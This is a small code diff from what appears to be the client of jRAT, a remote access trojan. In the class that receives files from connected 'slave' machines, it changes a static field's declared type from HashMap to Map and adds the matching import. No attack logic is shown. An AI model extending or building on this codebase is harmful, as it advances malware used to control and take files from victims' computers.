@@ -3,6 +3,7 @@ package pro.jrat.client.packets.incoming;
 import java.io.DataInputStream;
 import java.io.File;
 import java.util.HashMap;
+import java.util.Map;
 
 import javax.swing.JOptionPane;
 
@@ -17,7 +18,7 @@ import pro.jrat.common.io.TransferListener;
 
 public class Packet29ReceiveFile extends AbstractIncomingPacket {
 
-	public static final HashMap<Slave, FileData> data = new HashMap<Slave, FileData>();
+	public static final Map<Slave, FileData> data = new HashMap<Slave, FileData>();
 
 	@Override
 	public void read(final Slave slave, DataInputStream dis) throws Exception {
